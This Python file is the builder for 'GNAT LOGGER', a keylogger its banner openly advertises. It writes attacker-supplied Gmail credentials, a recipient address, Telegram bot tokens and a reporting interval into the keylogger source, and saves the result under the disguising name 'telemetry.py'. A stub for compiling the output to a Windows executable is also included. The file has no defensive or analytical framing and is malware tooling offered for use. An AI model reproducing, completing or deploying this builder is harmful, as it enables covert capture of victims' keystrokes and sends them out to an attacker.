#!/usr/bin/python3
import colorama

RED = colorama.Fore.RED
WHITE = colorama.Fore.WHITE
GREY = colorama.Fore.LIGHTBLACK_EX

banner = f"""{colorama.Style.BRIGHT}
{GREY}     ,,                ,,
    (((((              )))))    t.me/{WHITE}UndeadSec{GREY}
   ((((((              ))))))   youtube.com/c/{WHITE}UndeadSec{GREY} - BRAZIL
   ((((((              ))))))   v1.0
    ((((({WHITE},r@@@@@@@@@@e,{GREY})))))
     ((({WHITE}@@@@@@@@@@@@@@@@{GREY})))
      \{WHITE}@@/{RED},:::,{WHITE}\/{RED},:::,{WHITE}\@@{GREY}/{WHITE}
     /@@@|{RED}:::::{WHITE}||{RED}:::::{WHITE}|@@@\\
    / @@@\{RED}':::'{WHITE}/\{RED}':::'{WHITE}/@@@ \\
   /  /@@@@@@@//\\@@@@@@@\  \\
  (  /  '@@@@@====@@@@@'  \  )
   \(     /          \     )/ 
     \   (    {RED}GNAT{WHITE}    )   /
          \  LOGGER  /

{WHITE}    
A PYTHON KEYLOGGER by Franklin Timoteo

"""

import re
import argparse
import logging
import os
import sys
from time import sleep

logger = logging.getLogger(__name__)

parser = argparse.ArgumentParser(description='Set configs to gerenerate a new file')
parser.add_argument('-e', '--email', help='set a new email')
parser.add_argument('-p', '--password', help='set a new password')
parser.add_argument('-i', '--interval', type=int, default=60, help='set a new interval')
parser.add_argument('-t', '--to', help='set send to email')
parser.add_argument('-d', '--debug', default='ERROR', help='Enable debug loggs, use DEBUG')
parser.add_argument('-u', '--uid', help='uid telegram @myidbot')
parser.add_argument('-k', '--token', help='token bot telegram')
parser.add_argument('--enabletelegram', action='store_true', help='enable telegram as send form')
parser.add_argument('--enableemail', action='store_true', help='enable email as send form')
parser.add_argument('--force', default=False, action='store_true',help='disable interactive and force generate file')


def _re_replace(pattern, data, newstring):
    prog = re.compile(pattern)
    newdata = prog.sub(newstring, data, count=1)
    return newdata

def _change_defaults_file(email, password, to, uid, token, interval=60, enabletelegram=True, enableemail=True):
    """Search and replace vars values: 
        EDITWITHYOURGMAIL
        EDITWITHYOURGMAILPASSWORD
        INTERVALINSECONDS
        WHATDOYOUEAMILYOUWANTTOSEND
        USER_ID_TELEGRAM
        TOKEN
        ENABLE_TELEGRAM
        ENABLE_EMAIL
    """
    _filename = 'main.py'
    _filedist = 'telemetry.py'
    logger.debug('\nFile default: %s\nFile output: %s' %(_filename, _filedist))
    try:
        # @todo: melhorar regex selecionando apenas o valor após o =
        with open(_filename, 'r') as default_file:
            data = default_file.read()
            data = _re_replace(r"yourgmail=.+\n", data, "yourgmail='%s'\n" %email)
            data = _re_replace(r"yourgmailpass=.+\n", data, "yourgmailpass='%s'\n" %password)
            data = _re_replace(r"sendto=.+\n", data, "sendto='%s'\n" %to)
            data = _re_replace(r"interval=.+\n", data, "interval=%s\n" %interval)
            data = _re_replace(r"USER_ID_TELEGRAM=.+\n", data, "USER_ID_TELEGRAM=%s\n" %uid)
            data = _re_replace(r"TOKEN=.+\n", data, "TOKEN_BOT='%s'\n" %token)
            data = _re_replace(r"ENABLE_TELEGRAM=.+\n", data, "ENABLE_TELEGRAM=%s\n"%enabletelegram)
            data = _re_replace(r"ENABLE_EMAIL=.+\n", data, "ENABLE_EMAIL=%s\n"%enableemail)
            with open(_filedist, 'w') as distfile:
                distfile.write(data)

    except FileNotFoundError:
        print('File %s not found' %_filename)
    finally:
        print('File %s edited with success!' %_filedist)

def get_new_configs(params):
    logger.debug('Setting news configs with params: %s' %params)
    _shadow_params = params.copy()
    print('Enter to default or type new config.') 
    for key, value in _shadow_params.items():
        new_value = input('%s [ %s ] > '%(key.title(), value)) or value
        _shadow_params[key] = new_value
    return _shadow_params

def menu(args):
    logger.debug('Option menu selected')
    options_selected = args
    params = {
        'email': args.email,
        'password': args.password,
        'to': args.to,
        'uid': args.uid,
        'token': args.token,
        'interval': args.interval,
        'enabletelegram': args.enabletelegram,
        'enableemail': args.enableemail
    } 
    
    try:
        while True:
            os.system('clear')
            sys.stdout.write(banner)
            print('Params loaded: ')
            for key,value in params.items():
                print('- %s : %s' %(key,value))
            print(f'\n{RED}[{WHITE}S{RED}]{WHITE} Set new configs  {RED}[{WHITE}K{RED}]{WHITE} Generate file with new configs \n{RED}[{WHITE}C{RED}]{WHITE} Compile to exe   {RED}[{WHITE}Q{RED}]{WHITE} Quit')
            user_choice = input(f"\n{RED}Gnat{WHITE}-> ")
            if user_choice.upper() == 'S':
                sys.stdout.write('Setting new configs: ')
                new_params = get_new_configs(params)
                params.update(new_params)

            elif user_choice.upper() == 'K':
                _change_defaults_file(**params)
                sleep(3) # @question: clean exec and we not see result from change_defaults
            elif user_choice.upper() == 'C':
                ... # @todo: compile with pyinstaller and generate file exe
                # @todo: options: qemu | winehq | virsh
            elif user_choice.upper() == 'Q':
                raise KeyboardInterrupt
            else:
                sys.stdout.write('Select an option or press CTRL+C or Q to quit')

             
    except KeyboardInterrupt:
        os.system('clear')
        exit()

if __name__ == '__main__':
    args = parser.parse_args()
    email, password, interval, to = args.email, args.password, args.interval, args.to
    uid, token, enabletelegram, enableemail = args.uid, args.token, args.enabletelegram, args.enabletelegram
    fmt = "[%(levelname)s] %(funcName)s %(message)s"
    logging.basicConfig(format=fmt, encoding='utf-8', level=args.debug)
    logger.debug('Using args: %s' %args)
    logger.debug('Force generate file: %s' %args.force)

    if all([email, password, interval, to, uid, token, enabletelegram, enableemail]) or args.force:
        _change_defaults_file(email, password, to, uid, token, interval, enabletelegram, enableemail)
    else:
        menu(args)

